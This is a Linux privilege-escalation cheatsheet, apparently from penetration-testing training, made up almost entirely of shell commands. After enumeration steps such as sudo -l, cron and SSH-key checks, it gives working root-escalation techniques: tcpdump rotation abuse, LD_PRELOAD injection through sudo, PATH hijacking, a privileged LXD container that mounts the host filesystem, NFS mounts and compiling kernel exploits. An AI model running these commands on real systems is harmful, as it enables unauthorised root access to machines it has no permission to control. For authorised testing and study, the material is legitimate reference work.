# The Linux Privilege Escalation Cheatsheet
---

See processes running as root
```bash
ps aux \| grep root
```

See logged in users
```bash
ps au
```

View user home directories
```bash
ls /home
```

Check for SSH keys for current user 
```bash
ls -l ~/.ssh
```

Check the current user's Bash history
```bash
history
```

Can the user run anything as another user? 
```bash
sudo -l
```

Check for daily Cron jobs 
```bash
ls -la /etc/cron.daily
```

Check for unmounted file systems/drives
```bash
lsblk
```



Check the Kernel version
```bash
uname -a
```

Check the OS version
```bash
cat /etc/lsb-release 
```

Compile an exploit written in C 
```bash
gcc kernel_expoit.c -o kernel_expoit
```

Check the installed version of `Screen`
```bash
screen -v
```





Priv esc with `tcpdump
```bash
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Check the current user's PATH variable contents 
```bash
echo $PATH
```

Add a `.` to the beginning of the current user's PATH 
```bash
PATH=.:${PATH}
```

Search for config files
```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

View the shared objects required by a binary 
```bash
ldd /bin/ls
```

Escalate privileges using `LD_PRELOAD
```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

Check the RUNPATH of a binary
```bash
readelf -d payroll  \| grep PATH
```

Compiled a shared libary
```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

Start the LXD initialization process
```bash
lxd init
```

Import a local image
```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Start a privileged LXD container 
```bash
lxc init alpine r00t -c security.privileged=true
```

Mount the host file system in a container 
```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

Start the container
```bash
lxc start r00t
```

Show the NFS export list 
```bash
showmount -e 10.129.2.12
```

Mount an NFS share locally 
```bash
sudo mount -t nfs 10.129.2.12:/tmp /mnt
```

Created a shared `tmux` session socket
```bash
tmux -S /shareds new -s debugsess
```

Perform a system audit with `Lynis
```bash
./lynis audit system
```